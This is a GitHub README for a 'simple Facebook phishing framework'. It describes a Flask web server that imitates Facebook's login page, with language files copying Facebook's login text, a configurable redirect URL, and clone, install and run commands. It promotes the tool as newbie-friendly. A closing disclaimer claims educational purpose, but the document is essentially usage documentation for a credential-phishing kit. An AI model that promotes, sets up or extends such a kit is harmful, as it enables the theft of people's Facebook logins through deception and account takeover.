# A Simple Facebook Phishing Framework

Quickly fire up a Web Server written in Python(Flask) and phish for your facebook targets (ethicaly ofc).

[![DemoPage](https://raw.githubusercontent.com/Wh1ter0sEo4/SimpleFacebookPhishingPage/demo/demo.png)](https://wh1ter0seo4.github.io/SimpleFacebookPhishingPage/demo/)

Click [![DemoPageLink]Here](https://wh1ter0seo4.github.io/SimpleFacebookPhishingPage/demo/) to see a demo.

## Features

- Multi-Lang Support.
- Custom Redirect Link.
- Config Files, Customize to your liking without having to edit the source code.
- Cross Platform.
- Newbie Friendly.

## Platforms

Tested Platforms.

| Platform | Status |
| ------ | ------ |
| Linux | ✅ |
| Windows | - |
| MacOS | ✅ |
| BSD | ❌ |

## Availble Languages

| Language | Status |
| ------ | ------ |
| English | ✅ |
| French | ✅ |
| Spanish | - |
| Arabic | - |

If the language you're looking for isn't availble, creating new language is as easy as it gets, you just have to get your hands a little dirty.

1 - Create a new json ("en.js" in this example) file in the langpkg directory.

2 - Paste the following and change the values to the coresponding language.

```sh
{
	"title": "Facebook – log in or sign up", 
	"motd": "Facebook helps you connect and share with the people in your life.",
	"email": "Email address or phone number"	,
	"password": "Password",
	"login": "Log In",
	"forgot": "Forgotten password?",
	"new-account": "Create New Account",
	"new-page": "Create a Page%end_bold% for a celebrity, brand or business."
}
```
%end_bold% is where the bold part should end in the new-page paragraph.

then refer to the lang code in the config.json file.

```sh
{
	"lang": "en",
	 "redirect_url": "http://example.com"
}
```

## Installation (Linux 4.9+)

This framework requires [Python](https://www.python.org/) v3+ to run.

Git clone the current github page and install all the dependencies.

```sh
git clone https://github.com/Wh1ter0sEo4/SimpleFacebookPhishingPage
cd SimpleFacebookPhishingPage
pip3 install waitress flask colorama
```

## Usage (Linux 4.9+)

```sh
python3 main.py
```

Once all steps are done and no errors are shown, you can head over to http://localhost if you're hosting it locally or your remote machine's IP/Domain.

DO NOT USE THIS TOOL TO FARM ACTUAL LOGGING CREDENTIALS, IT'S MADE STRICTLY FOR EDUCATIONAL & EXPERIMENTAL REASONS. I, THE CREATOR OF THIS TOOL, AM NOT RESPONSABLE FOR ANY DAMAGE YOU MAY CAUSE.
